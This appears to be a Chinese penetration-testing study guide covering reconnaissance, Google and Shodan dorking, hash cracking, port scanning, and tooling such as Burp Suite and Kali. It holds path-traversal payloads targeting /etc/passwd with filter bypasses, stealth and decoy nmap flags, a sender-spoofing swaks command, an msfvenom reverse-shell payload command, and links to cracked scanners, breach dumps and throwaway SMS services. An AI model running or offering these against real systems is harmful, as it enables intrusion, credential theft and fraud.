# 最基础使用# 参数含义-e 指定语言（java/python等） -x 排除某种返回码dirsearch -u https://baidu.com -e java -x 404
```

**burpsuite**
BurpSuite Content discovery能自动化的的爬取扫描。

##### 目录爆破经验

网上很多目录爆破只讲述了通过御剑或类似工具对URL进行拼接
还存在于网站中可访问本站资源的位置。比如图像。
有的站点资源目录不是使用..来回到上级，而是采用绝对路径。这明确的暴露了我们与根目录有多少层级可以通过转化相对路径来到达。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609114611136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
爆破目录后，只需要攻破爆破的目录就意味着你攻破了主目录。有时候有的目录与主目录代码架构完全不一样，这意味着你攻破的路径更宽。

##### 图像

简单的右键单击查看了它的显示图像作为查看图像。
调整您的 burp 套件以捕获正在进行的HTTP 请求并将其与Repeater共享
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604142648871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在 GET 请求中，在上图中，您可以注意到filename=67.jpg，让我们尝试更改此文件名

```bash
filename=../../../etc/passwd
```

成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060414274930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 阻塞遍历序列

当你被阻塞时，可以尝试下面的：
当“../”被阻塞了。让我们尝试在没有任何前面的值的情况下输入/etc/passwd。

使用“双点加双斜杠”来操作 URL 文件名参数，即“ ….//….//….//etc/passwd”

在 ASCII 到 URL 编码器转换器的帮助下将“../”转换为“..%252f”和已成功访问密码文件`=..%252f..%252f..%252fetc/passwd`

许多开发人员在所需变量的末尾添加“.php”扩展名，然后再将其包含在内。
因此，网络服务器将/etc/passwd解释为/etc/passwd.php，因此我们无法访问该文件。为了摆脱这个“.php”，我们尝试使用空字节字符 (%00)终止变量，这将迫使 php 服务器在解释之后立即忽略所有内容。

**IP收集**
如果有DNS需设法进行绕过，如何绕过请看本文后面章节。最后，需要在网站中直接输入域名访问以证实真伪。
**C段**
简单来说就是不同服务器上的不同站点，网站搭建用不同的服务器搭建不同的站点，但都属于同一个站点，我们可以攻击其中一个网站，通过内网渗透从而获取其他网站的权限。

在线C段查询：https://chapangzhan.com/

## 钓鱼

## 监控

监控是否有新的端口开放nmap_diff

应用程序是否发生改变

## 内部信息搜集


# 工具

工具这一部分除了参考我简介的基本规则，你最需要的是上手练习以及理解这些工具是做了什么事，尤其是在不知道为什么报错时。练习无话可说，别贪全能上手就行。理解工具可以用进程抓包工具，比如WSExplorer或火绒剑看软件发了什么请求。
另外这部分内容我会尽可能稀释，将会尽可能实用、精简的介绍工具。不然你阅读可能会感到乏味，部分工具的使用我会移入后续章节![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716002538181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 虚拟机

很多人都使用的是VMware Workstation Pro
**配置上网**

桥接（Bridged）：VMnet0连接，类似与一个网络环境下的两台电脑。如果主机开了DHCP则虚拟机可以自动获取ip，如果是在局域网没有获得DHCP的设备，就需要手动配置IP，将IP配置到同一网段内

 网络地址转化（Network Address Translation）：Vmnet8连接，类似孕妇，虚拟机通过主机上网

  主机网络（Host-Only）：Vmnet1连接，虚拟机只能和主机通信不能上网。






## 学会上网

### 学会用普通搜索引擎

(以下的baidu代表站点)
你搜索其标题还可以得到更多的信息
或者搜baidu
或者搜baidu php

### 暗网

暗网下载链接，官方网址 https://www.torproject.org/zh-CN/download/   使用也很简单，我直接全点下一步安装，电脑挂上我的VPN，就可以轻松上网。
*新手可能跟我一样，逛了一圈感觉没啥东西。网上资源太少，请待我收集整理~*
*待完善：暗网黑客资源*

### google hack


1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件
2、intitle： 把网页标题中的某个字符作为搜索的条件
3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息
4、filetype/ext： 指定一个格式类型的文件作为搜索对象
5、inurl： 搜索包含指定字符的URL
6、site： 在指定的(域名)站点搜索相关内容　　
GoogleHacking其他语法
1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索
2、or 同时搜索两个或更多的关键字
3、link 搜索某个网站的链接 link:http://baidu.com即返回所有和baidu做了链接的URL
4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:
google-hacking-databaseGoogleHacking典型用法(特定资产的万能密码也要积累)

管理后台地址
inurl:"login"|inurl:"logon"|inurl:"admin"|inurl:"manage"|inurl:"manager"|inurl:"member"|inurl:"admin_login"|inurl:"ad_login"|inurl:"ad_manage"|inurl:"houtai"|inurl:"guanli"|inurl:"htdl"|inurl:"htgl"|inurl:"members"|inurl:"system"(|inurl:...) (-忽略的文件名)

错误消息

(site:域名) intext:"error"|intext:"warning"|intext:"for more information"|intext:"not found"|intext:"其他错误消息" (-排除的信息)

数据库的转储

(site:域名) # Dumping data for table(user|username|password|pass) (-排除的信息)


更多组合 我们可以把自己的搜索与能获取更好的结果的搜索项一起使用

1.当查找email时，能添加类似 通讯录 邮件 电子邮件 发送这种关键词

2.查找电话号码的时候可以使用一些类似 电话 移动电话 通讯录 数字 手机


用户名相关
(site:域名) intext:"username"|intext:"userid"|intext:"employee.ID"(|intext:...) "your username is" (-排除的信息)

密码相关

(site:域名) intext:"password"|intext:"passcode"(|intext:...) "your password is" "reminder forgotten" (-排除的信息)

公司相关

(site:域名) intext:"admin"|intext:"administrator"|intext:"contact your system"|intext:"contact your administrator" (-排除的信息)

web 服务器的软件错误消息

（site:域名）intitle:"Object not found!" "think this is a server error" (-排除的信息)

各种网络硬件设备

"Version Info" "BootVesion" "Internet Settings" 能找到 Belkin Cable/DSL路由器 ......
site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录

```bash
site:"www.baidu.com" intitle:login intext:管理|后台|登录|用户名|密码|验证码|系统|账号|manage|admin|login|system
```

上传类漏洞地址

site:http://target.com inurl:file
site:http://target.com inurl:upload

注入页面

site:http://target.com inurl:php?id=
（批量注入工具、结合搜索引擎）


目录遍历漏洞
site:http://target.com intitle:index.of

SQL错误

site:http://target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:”Warning: mysql_query()" | intext:”Warning: pg_connect()"

phpinfo()

site:http://target.com ext:php intitle:phpinfo "published by the PHP Group"

配置文件泄露

```bash
site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini
```

数据库文件泄露

```bash
site:http://target.com ext:.sql | .dbf | .mdb | .db
```

日志文件泄露

```bash
site:http://target.com ext:.log
```

备份和历史文件泄露

```bash
site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar
```

公开文件泄露

```bash
site:http://target.com filetype:.doc .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv
```

邮箱信息

```bash
site:http://target.com intext:邮件 | email |@http://target.com 
```

社工信息

```bash
site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z
```



### 空间搜索引擎

大多数空间搜索引擎爬虫相比于谷歌百度等都更及时和更深层，比如通常爬几分钟之前.使用的时候你应该将ip或url测试所有的空间搜索引擎工具，因为它得到的结果是不一样的。

#### Shodan

要收费，我在淘宝上买了别人的会员号，大概30多终身一个号。
 Shodan上搜索出来的可不是单纯的信息，而是所有接入互联网的设备！比如你的电脑、手机、摄像头甚至打印机。[官网地址](https://www.shodan.io)
 shodan可以搜索以下关键词：
 **摄像头**
网络摄像头 webcan、netcam

traffic signals

**路由器**
Ciso

**GPS**
GPS
**端口**
port:80/3389
port:80,21


hostname：　　搜索指定的主机或域名，例如 hostname:”google”
port：　　搜索指定的端口或服务，例如 port:”21”
country：　　搜索指定的国家，例如 country:”CN”
city：　　搜索指定的城市，例如 city:”Hefei”
org：　　搜索指定的组织或公司，例如 org:”google”
isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”
product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”
version：　　搜索指定的软件版本，例如 version:”1.6.2”
geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”
before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”
net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”


####  censys搜索引擎

censys搜索引擎功能与shodan类似,只是搜索功能免费，证书分析功能不错。
地址：https://search.censys.io/search?resource=hosts

搜索语法

默认情况下censys支全文检索。

23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not
80.http.get.status_code: 200　　指定状态
80.http.get.status_code:[200 TO 300]　　200-300之间的状态码
location.country_code: DE　　国家
protocols: (“23/telnet” or “21/ftp”)　　协议
tags: scada　　标签
80.http.get.headers.server：nginx　　服务器类型版本
autonomous_system.description: University　　系统描述


#### 钟馗之眼

钟馗之眼搜索引擎偏向web应用层面的搜索。
地址：https://www.zoomeye.org/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701174924633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

搜索语法

app:nginx　　组件名
ver:1.0　　版本
os:windows　　操作系统
country:”China”　　国家
city:”hangzhou”　　城市
port:80　　端口
hostname:google　　主机名
site:thief.one　　网站域名
desc:nmask　　描述
keywords:nmask’blog　　关键词
service:ftp　　服务类型
ip:8.8.8.8　　ip地址
cidr:8.8.8.8/24　　ip地址段


#### FoFa搜索引擎

FoFa搜索引擎偏向资产搜索。
地址：https://fofa.so
语法不必特意去学，在访问界面中就有
当你在发现所寻找的正规网站，空间搜索引擎结果返回一些其他国家的网站，你不用太在意这种干扰，这是网站在做seo的结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630194435802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



#### Dnsdb搜索引擎

dnsdb搜索引擎是一款针对dns解析的查询平台。
地址：https://www.dnsdb.io/



## DNS信息收集

使用 Dig 执行 Zone Transfer 的结果与使用 NSLookup 的结果相同。两者之间的主要区别在于其输出的格式。在选择使用这两种工具中的哪一种时，取决于偏好和可用性
以下展示了DNS的正向查询与反向查询结果

### dig

执行反向 DNS 查找将 IP 地址转换为其主机名。为此，我们需要以相反的顺序写入 IP 地址（例如 192.168.1.1 将是 1.1.168.192），然后附加“.in-addr.arpa”。到它。接下来我们需要使用 DIG 查询 PTR 记录。让我们对 216.92.251.5 进行 DNS PTR 查询，这里的命令是“dig 5.251.92.216.in-addr.arpa PTR”

### nslookup

![/](https://img-blog.csdnimg.cn/20210602183521855.png)
如您从这张图片中看到的，我们从我们执行的查询中只收到了一条记录。我们获得这个单一结果是因为我们没有指定查询类型。默认情况下，如果未指定查询类型，nslookup 将检索域的 A 记录。

要指定查询类型，您需要在命令中添加“-query=”选项。以下是您可以选择的查询类型列表。

NS：查询给定名称服务器的域 NS 记录
PTR：查询 IP 地址的反向查找（PTR 记录）
ANY：查询任何可用记录
AXFR：查询域的整个区域文件的给定名称服务器
MX：查询域的邮件服务器（MX 记录）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210612235509451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### hash相关工具

#### 识别

kali上有集成hashid。HashID 是由 psypanda 创建的用于替代 hash-identifier 的工具。HashID 可以使用正则表达式识别超过 210 种独特的哈希类型。此外，它可以识别单个散列、解析文件或读取目录中的文件以及其中的 id 散列。使用 hashid 的语法是“hashid 选项输入”。例如，如果您想确定散列的散列类型“2b4d9aa78976ec807986c1ea298d32418c85581b5625796c49bd6ecc146b1ef9”，则语法将是“hashid 2b4d9aa781986c59b48c5986c598c56c598c598c58c58c5986e8c88c868c868c568c868c568c868c568c868c568c568c568c568c56796c8625796c49bd6e
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602123135715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602123438725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
kali上还有类似的工具是Hash-identifier,但是功能没有这么强大。使用方法仍旧一样，但你仍需学会，因为针对一个hash值不同的工具识别结果可能会不一样。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602124320696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 破解

##### john

运行 John the Ripper 的基本语法是 john [options] [hashfile]。使用John最基本的语法是“john hashes.txt”，它尝试了一系列常见的破解模式。此命令告诉 John 尝试简单模式，然后是包含可能密码的默认单词列表，最后是增量模式。以这种方式使用 John 非常耗时，不建议用于密码/哈希破解。
比较推荐的密码/哈希破解方法是使用单词列表并指定哈希类型。为此，选项 --wordlist 用于指定具有潜在密码列表的文件，而 --format 用于指定哈希类型。例如，将这些选项与 snefru-256 哈希类型一起使用的语法是“john --wordlist=rockyou.txt --format=snefru-256 hashes.txt”。要查看用于破解哈希 2b4d9aa78976ec807986c1ea298d32418c85581b5625796c49bd6ecc146b1ef9（已添加到文件 hashes.txt）的此语法的示例
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602125119510.png)
于密码位于rockyou.txt 文件中并且snefru-256 被识别为正确的哈希类型，因此密码/哈希破解花费的时间非常短。这个过程并不总是那么快，可能需要数小时才能破解更复杂的密码/哈希。

##### hashcat

多算法，资源利用率低，基于字典攻击，支持分布式破解等等。kail有集成

> -a  破解模式。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
> -m  指定要破解的hash类型，如果不指定类型，则默认是MD5
> --force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项


```bash
hashcat -a 0 -m 1000 hash文本路径 字典路径 --force
```


详细中文介绍hashcat工具文档看 https://xz.aliyun.com/t/4008



### 邮箱信息

#### 搜集

**只适用于大型网站**
要想爆破邮箱账号，肯定首先得有足够多的邮箱账号。那么，我们从哪里去获取目标邮箱系统的邮箱账号呢？

https://hunter.io/  
https://www.email-format.com/i/search/
这两个网站只要输入目标域名，就可以从互联网上搜到对应格式的邮箱账号

**看天意**
常用的邮箱名是：姓名拼音@xx.com
可以靠常用姓名的拼音来对邮箱进行猜

#### 验证是否被弃用

https://mailtester.com/testmail.php
https://github.com/Tzeross/verifyemail

#### 验证邮箱是否泄露了密码 

**待补充，国内密码泄露与国外泄露数据库，以及如何使用**
https://haveibeenpwned.com/

获取 email 帐户的最佳方法之一是持续监控和捕捉过去的违规行为。我不想直接链接到违规文件，但我给出一些我认为有用的参考:
1.4 亿密码泄露（2017年）： https://thehackernews.com/2017/12/data-breach-password-list.html
Adobe 信息泄露（2013年）： https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/
Pastebin Dumps： http://psbdmp.ws/
Exploit.In Dump
Pastebin 的 Google Dork: site:pastebin.com intext:cyberspacekittens.com

## 综合工具

### 信息搜集

#### 电子邮件

从侦察阶段收集到的针对所有用户的大规模攻击，有很多很棒的资源可用于侦查和创建可定位的电子邮件地址列表，比如2019年的OSINT资源，The Harvester ，datasploit ，Github上的awesome-osint ）

##### Swaks

Swaks是由John Jetmore编写和维护的一种功能强大，灵活，可脚本化，面向事务的SMTP测试工具。可向任意目标发送任意内容的邮件。 
“swaks”这个名字是”SWiss Army Knife Smtp”的首字母缩略词.
发布网站http://www.jetmore.org/john/code/swaks/ 
这个工具kali自带。

使用细节

```bash
    To:收件人    From:发件人    Subject:主题    Date:日期    Subject:标题
```

通常怎么使用

```bash
swaks --body "内容" --header "Subject:标题" -t xxxxx@qq.com -f "admin@local.com"
```




#### 发现电子邮件

https://github.com/laramies/theHarvester (100% 免费)
https://phonebook.cz/ (100%免费)
https://maildb.io/
https://hunter.io/
https://anymailfinder.com/
**theHarvester**

TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、PGP、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602182750844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210602183054356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### sparta

kali已经集成，Sparta是一个Nmap、Nikto、Hydra等工具的集合，利用各个工具的优秀功能，完成信息收集、扫描和爆破等一体化的工具流。

Sparta主要包含以下功能：

端口扫描，程序自动调用nmap进行扫描，根据nmap的扫描结果，nikto自动加载结果，展开更精确的扫描。
针对扫描的结果，特定使用，如：使用dirbuster目录爆破，利用webslayer进行web指纹识别。
针对可爆力破解的端口，可调用hydra进行暴力破解。

**使用方法**
第一次在kali 中使用 需要先下载文件 

```bash
#这是我克隆到码云的，会加快国内下载速度。如果你不信任这个链接，请将链接改成  https://github.com/SECFORCE/sparta.gitgit clone https://gitee.com/ngadminq/sparta.git#切换到sparta文件夹，检索到sparta.py文件，利用python环境进行运行python3 sparta.py
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609161602160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




### 扫描端口

选一。以下工具在kali都有集成。
学习时了解基础参数用法，工具优缺点即可。
当在kali输入工具名时，就会弹出日志信息，这就能有效节约时间了，如下图
![在这里插入图片描述](https://img-blog.csdnimg.cn/619526b0f8d04cc9b9728484e25cc2b7.png)
我之前的文章版本写了关于nmap如何扫描漏洞等，但术业有专攻，nmap速度又慢，所以如果读者看到类似的文章，可选择性略读。

#### nmap

**扫描类型**
 全扫描
 即指TCP
全连接：默认扫描方式，扫描快但这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。

```bash
nmap -sT www.baidu.com
```

Open port: SYN --> SYN/ACK --> RST
Closed port: SYN --> RST/ACK
Filtered port: SYN --> [NO RESPONSE]
Filtered port: SYN ->ICMP消息

****

半扫描
SYN/ACK，相对隐蔽点

```bash
nmap -sS www.baidu.comnmap -sA www.baidu.com
```

其他扫描

```bash
# ICMPnmap -sP www.baidu.com
```


**攻击网站扫描参数**
此参数将尽可能全面、隐蔽。
有些参数耗时将很长，显示文档将太过全面。所以读者可以适当调整

```bash
nmap -A -v -sA -T0 --osscan-guess -p- -P0 --script=vuln --spoof-mac 09:22:71:11:15:E2 --version-intensity 9 –D decoy1,decoy2,decoy3,target -oX log.xml
```

**常用命令**

```bash
nmap -A www.baidu.com## Nmap fast scan for the most 1000tcp ports usednmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> ## Nmap fast scan for all the portsnmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> ## Nmap fast scan for all the ports slower to avoid failures due to -T4nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>#Bettercap2 Scansyn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```


#### nbtscan 

#### masscan

**masscan** 该工具兼容Nmap 参数
扫描快但是不会显示端口服务的相关信息，将Nmap和Masscan结合，扬长避短，实现高效率扫描。为提高扫描效率，可以先使用masscan扫描开启的端口，再用nmap进行详细的扫描.[nmap](https://xz.aliyun.com/t/6001)![在这里插入图片描述](https://img-blog.csdnimg.cn/20210429021050113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)






### 抓包工具

### 进程装包

  http://www.downcc.com/soft/11196.html
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625104540882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### Wireshark

Wireshark是绝对经典的，最著名的网络分析仪和密码破解工具。此工具是网络数据包分析器，该工具将尝试捕获用于分析，网络故障排除，分析，软件和通信协议开发的网络数据包，并尽可能详细地显示获得的数据包数据。
在Wireshark中，有颜色代码，用户可以看到以黑色，蓝色和绿色突出显示的数据包。一眼就能帮助用户识别流量类型。黑色确定存在问题的TCP数据包。蓝色是DNS流量，绿色是TCP流量。
只是这个工具很难控制，开启一秒钟就有大量数据包，需要我们一点点的筛选判断才能找准目标
Wireshark官方下载链接： https://www.wireshark.org/download.htmlZ

#### Burpsuite

看看详细文档粗略了解一下bp作用
[官方burpsuite教程](https://portswigger.net/support/the-burp-methodology)
[burpsuite 非官方中文教程](https://t0data.gitbooks.io/burpsuite/content/)

##### 使用前准备

2021/8已有Burp8破解版，主要区别是能识别http2（相较于http1支持一个ip并发访问）漏洞，界面上也更加好用美观还内嵌浏览器录屏等。网上有免破解版

bp使用通常会装上很多可行的插件，[手动安装方法可参见，值得注意一点手动安装的目录必须是英文名，中文名会报类似于java.class/lang等错误](https://blog.csdn.net/qq_57868287/article/details/118121428)。安装插件可参见，[官方burpsuite十大流行工具](https://portswigger.net/solutions/penetration-testing/penetration-testing-tools)
我使用的burpsuite插件：

 - Autorize 强大的越权自动化测试工具
 - Software Vulnerability Scanner 自动根据版本号查找 CVE

[burpsuite模块介绍](https://www.mad-coding.cn/2019/10/15/burpsuite%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/#0x01)
在面试和实战中需要区分burpsuite攻击参数注入的基本方式

1. Sniper（狙击手）
   一个一个的来
   添加了一个参数的话，并且假设payload有500个的话，那就执行500次，


如果添加了两个参数的话，就会挨着来，第一个参数开始爆破时，第二个不变，如此这样，会进行500+500此 总共1000次爆破。


2. Battering ram（攻城锤）
   顾名思义，和狙击手差不多，一个参数的话都一样，只不过如果添加了两个参数的话，就一起进行爆破。那么两个参数爆破时候的值肯定就是一样的了。那么就只会进行500次爆破。

3. Pitchfork（草叉模式）
   此模式下如果只添加了一个参数的话，会报错


添加了两个参数的话 ，要求添加两个payload
pl1：1，2
pl2：3，4
那么第一爆破为 1，3
而二次爆破为2，4
如果两个payload行数不一致的话，取最小值进行测试。所以爆破的次数取两个中最小的为准。

4. Cluster bomb（集束炸弹）
   同pitchfork，起码两个参数，但此操作会计算两个的payload 的笛卡儿积。
   比如pl1：1，2，3
   pl2：4，5，6
   那么第一次爆破为 1，4
   第二次为1，5
   以此类推 1，6
   2，4
   2，5.。。。。。。


**常见问题**
[burp总是抓到垃圾数据](https://www.mad-coding.cn/2020/03/06/burp%E6%80%BB%E6%98%AF%E6%8A%93%E5%88%B0%E6%97%A0%E7%94%A8%E5%8C%85%E7%9A%84%E5%9B%B0%E6%89%B0/)

### 通用漏洞扫描工具

nessus、openvas、xray、AWVS、NetSparker等

#### 主机扫描

**Nessus** 

Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用 Nessus 作为扫描该机构电脑系统的软件。
如何破解[http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1](http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1)

#### 网站扫描

AWVS较为轻量，扫描快。APPscan大但全，一般为发现网站漏洞会结合使用
**Awvs**
注意:登录类网站扫描要带cookies扫才能扫到
awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接，具体看https://blog.csdn.net/weixin_41924764/article/details/109549947
kali的docker安装 https://www.sqlsec.com/2020/04/awvs.html

**AppScan**
10.0.2安装破解 https://www.cnblogs.com/azhyueqin/p/14336807.html

**burpsuit主动扫描**

**xray**
如果对方存在waf前面的主动扫描方式会有被封ip风险，xray相对来讲更安静

### Cobaltstrike

集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具

### kali

kali有600+渗透工具。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510222251130.png)

https://blog.csdn.net/jayjaydream/article/details/82945384

#### 安装kali

很多黑客教学都是首先教你装一个虚拟机，再将kali系统装在虚拟机上。如果你用这样方式去攻击外网服务器，那么你可能需要使用到端口转化/端口映射。
但是最好的最快的方式是用U盘。一旦移除U盘，你的系统就将恢复
Kali安装到u盘加密、持久化    https://www.freebuf.com/sectool/271770.html

如果你不想系统直接变为KALI,且电脑装虚拟机卡顿，就在 https://cloud.tencent.com/online-service?from=developer|auth 注册一个云服务吧，我选的学生认证，价格是27/3月，但这个认证可选择而对系统较少，我没法直接选择Debian，就选择了centos，![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616164431360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
然后一步步跟随以下命令就可以安装成功。具体可以参考博客 https://blog.csdn.net/sc_Pease/article/details/107243610

```bash
yum install dockersystemctl start dockersystemctl status dockerdocker pull registry.cn-hangzhou.aliyuncs.com/fordo/kali:latestdocker run -i -t 53e9507d8515 /bin/bash
```

安装成功后，进入kali系统后，输入nmap，打印如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616170405781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 扫描目标网站

通常来讲一个网站有子域名，而对于主站的扫描通常不能指望一下能发现敏感信息
**Nikto**是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。

```bash
# 扫描ip端口并输出报告nikto -host URL/IP -port 80 -o res.html
```

扫描映射web信息
cewl www.xxx.com

扫描网站服务器信息（对http协议可用）
whatweb www.xxx.com

根据上面扫描的IP地址进行漏洞扫描，扫描开放的端口
nmap xxx.xxx.xxx.xxx -v




## 社会工程

setkits
默认集成在了kali；
社会工程学模块包含了很多功能，若鱼叉式网络攻击、网页攻击、邮件群发攻击、无线接入点攻击、二维码攻击等等。

## 后门

### msfvenom

msfvenom集成了msfpayload和msfencode
msfvenom重要参数：
-p payload设置 
-e 编码设置	用来做免杀                   
-a 系统结构
-s payload最大大小   
-i 编码次数
-o 输出文件
-f 生成文件格式。生成脚本执行文件或平台执行文件，如py,dll，exe等  `
 –x | -k	捆绑生成。伪装类似图片马的意思
 以下是常用命令

```bash
msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:\back.exe
```

#### Cobalt Strike

用来后期持久渗透，横向移动，流量隐藏、数据窃取的工具


## 待补充：购物建议

### 硬件

### 服务器

### 代理

**匿名性**
透明代理：告诉服务器你使用了代理IP，与你的真实IP
普通匿名：会告诉服务器使用了代理，但并不会泄露本机的真实IP
高级匿名：完全伪造IP

#### 国内

#### 国外

选离你所在的城市近的国家

## 你常用的

### 匿名工具

**手机**
下面是一些免费的接码平台，可以收取短信验证码

国际接码，不过中国的也很多 https://yunjisms.xyz/

大多是其他国家的手机号，你注册有的网站可能无法识别此号码https://www.bfkdim.com/
https://jiemahao.com
http://zg.114sim.com/


http://114sim.com/

https://yunduanxin.net/
http://z-sms.com/
https://zusms.com

www.kakasms.com
www.materialtools.com
www.suiyongsuiqi.com
mianfeijiema.com
www.114sim.com
yunduanxin.net
www.shejiinn.com
www.zusms.com


**邮箱**
好用 https://www.moakt.com/zh
https://temp-mail.org/zh/
https://www.guerrillamail.com/zh/
http://links.icamtech.com/

VPS

纯净无线设备

纯净移动设备

### 开放漏洞情报

cve
exploit.db
cnvd
cx security
securitytracker

### 寻找EXP

**搜索引擎**
用搜索引擎搜索格式为：服务+版本+漏洞。比如织梦2.01漏洞
或用shodan使用https://exploits.shodan.io/
**网站**
0day.today － 世界最大的漏洞利用数据库公开了大量EXP工具，网站地址：https://cn.0day.today/

exploit.db

> 官方推特：@ExploitDB
> searchsploit是一个离线Exploit-DB的命令行搜索工具

seebug
